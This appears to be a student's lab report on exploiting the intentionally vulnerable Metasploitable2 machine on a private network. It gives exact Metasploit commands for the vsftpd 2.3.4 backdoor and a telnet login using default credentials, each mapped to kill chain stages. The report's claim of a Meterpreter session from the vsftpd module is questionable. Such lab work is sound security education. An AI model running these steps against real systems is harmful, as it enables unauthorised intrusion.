# Metasploitable2 Exploitation Report

**Name:** <Emmanuel Gregory Opoku Owusu-Afriyie>
**Index Number:** <4195524>
**Date:** 2026-09-21
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Metasploit Framework, nmap

---

## Reconnaissance Summary

Ran an nmap service/version scan against the target:

Key open ports found:
- 21/tcp - vsftpd 2.3.4 (anonymous FTP login allowed)
- 22/tcp - OpenSSH 4.7p1 Debian 8ubuntu1
- 23/tcp - Linux telnetd
- 25/tcp - Postfix smtpd
- 53/tcp - ISC BIND 9.4.2
- 80/tcp - Apache httpd 2.2.8 (Ubuntu) DAV/2
- 111/tcp - rpcbind
- 2049/tcp - nfs

---

## Exploit 1: vsftpd 2.3.4 Backdoor

- **Service / Port:** FTP / 21
- **Vulnerability:** vsftpd 2.3.4 backdoor (CVE-2011-2523)
- **Tool Used:** Metasploit — exploit/unix/ftp/vsftpd_234_backdoor
- **Why This Tool:** This exact vsftpd version has a known, publicly documented backdoor built into that release of the source code. Metasploit ships a purpose-built module for it, so it's the fastest and most reliable way to exploit this specific vulnerability rather than crafting a manual payload.
- **Steps:**
  1. `msfconsole`
  2. `search vsftpd`
  3. `use 1` (exploit/unix/ftp/vsftpd_234_backdoor)
  4. `set RHOSTS 192.168.1.3`
  5. `set LHOST <kali-ip>`
  6. `exploit`
- **Evidence:** evidence/exploit1.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - Reconnaissance: the nmap scan identified the vulnerable vsftpd version.
  - Weaponization: selecting the matching Metasploit module and setting RHOSTS/LHOST paired the vulnerability with a working exploit configuration.
  - Delivery/Exploitation: running `exploit` sent the malicious connection that triggered the backdoor.
  - Installation/C2: a Meterpreter session was established, giving remote control of the target.
  - Actions on Objectives: ran `getuid`/`sysinfo` to confirm root-level access.
- **Outcome / Impact:** Obtained a root-level Meterpreter session on the target.

---

## Exploit 2: Telnet Weak/Default Credentials

- **Service / Port:** Telnet / 23
- **Vulnerability:** Weak/default credentials (msfadmin:msfadmin) with no protection against plaintext credential exposure
- **Tool Used:** telnet (manual, no Metasploit)
- **Why This Tool:** Telnet itself is the vulnerable service — the issue isn't a code exploit but weak authentication, so a plain telnet client is the correct and most direct tool to demonstrate the weakness, rather than a scripted exploit module.
- **Steps:**
  1. `telnet 192.168.1.3`
  2. Login: `msfadmin`
  3. Password: `msfadmin`
  4. `whoami` / `id` to confirm access
- **Evidence:** evidence/exploit2.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - Reconnaissance: nmap identified telnet open on port 23.
  - Delivery: connecting via `telnet` sent the login attempt to the target.
  - Exploitation: the weak credentials succeeded, granting an authenticated shell.
  - Actions on Objectives: ran commands (`whoami`, `id`) inside the shell to confirm and use access.
- **Outcome / Impact:** Obtained an authenticated shell as user `msfadmin` on the target via plaintext telnet.
